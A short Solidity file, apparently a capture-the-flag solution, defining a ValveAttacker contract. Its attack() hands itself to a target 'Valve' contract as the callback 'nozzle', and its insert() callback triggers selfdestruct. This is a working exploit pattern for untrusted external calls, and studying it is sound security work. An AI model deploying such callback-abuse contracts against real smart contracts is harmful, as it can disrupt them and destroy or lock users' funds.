// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface INozzle {
    function insert() external returns (bool);
}

interface IValve {
    function openValve(INozzle) external;
}

contract ValveAttacker {
    function insert() public returns (bool) {
        selfdestruct(payable(address(0)));
    }

    function attack(address valveAddress) public {
        IValve(valveAddress).openValve(INozzle(address(this)));
    }
}
